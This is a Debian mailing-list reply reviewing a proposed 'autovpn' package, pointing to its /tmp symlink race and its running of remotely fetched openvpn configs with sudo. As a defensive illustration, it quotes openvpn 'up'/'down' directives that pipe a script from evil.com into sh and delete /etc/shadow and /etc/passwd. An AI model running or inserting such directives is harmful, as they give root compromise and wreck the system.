@@ -1,0 +1,53 @@
+To : Michael Meskes <meskes@debian.org>
+Subject : Re: Bug#890816: ITP: autovpn -- Connect to a VPN in a country of your choice
+From : Steve Kemp <steve@steve.org.uk>
+Date : Mon, 19 Feb 2018 11:53:06 +0000
+Message-id : 20180219115306.pqtbysi7ql3noc55@steve.org.uk
+In-reply-to : <[🔎] 1519040680.2249.78.camel@debian.org>
+References : <[🔎] 151903374360.26582.6225833500544932274.reportbug@feivel> <[🔎] 20180219104939.lrq4tlstqcipee4z@steve.org.uk> <[🔎] 1519040680.2249.78.camel@debian.org>
+
+
+On Mon Feb 19, 2018 at 12:44:40 +0100, Michael Meskes wrote:
+> >   * It relies upon the external VPNGate.net site/service.  If this
+> >     goes away in the lifetime of a stable Debian release users will
+> >     be screwed.
+> 
+> That is actually a good point. I wonder if using a local copy might be
+> a good alternative.
+  If you're willing to maintain such a list, resyncing it every
+ few days/months to reap dead-entries and add new ones then that
+ would be good.
+> >   * It allows security attacks against the local system, which other
+> >     users on the host could exploit via symlink attacks on
+> > /tmp/openvpnconf
+> 
+> True, but this could be handled by using a better system to access a
+> temp file.
+  Sure.  If you changed the code to use ioutil.TempFile, or some
+ other secure alternative that specific objection will go away.
+> >     1.  The tool downloads a remote URL to /tmp/openvpnconf
+> > 
+> >     2.  The file is then given as an argument to the command:
+> >             sudo openvpn /tmp/openvpnconf
+> > 
+> >     3.  That generated/downloaded openvpn configuration file could
+> >        be written to do anything, up to and including `rm -rf /`.
+> 
+> Can you actually get openvpn to do this?
+  Yes.  For example these snippets will do what you fear they will:
+    script-security 2
+    up curl http://evil.com/root-me.sh | sh
+    up rm /etc/shadow
+    down rm -f /etc/passwd
+> I read this not as "insecure for the system it runs on" but "insecure
+> on the connection side". This is certainly not something you should use
+>   to open your local network to, or to do something illegal.
+  As per the insecure fixed name, and the execution of commands from
+ a remote HTTP-site (not even SSL!) I think it is insecure in all
+ regards.
+  Also I guess you'll need to change the script to remove "sudo", or
+ better yet add a restricted user with sudo's nopasswd setup for it
+ (shudder).
+Steve
+-- 
+https://www.steve.org.uk/
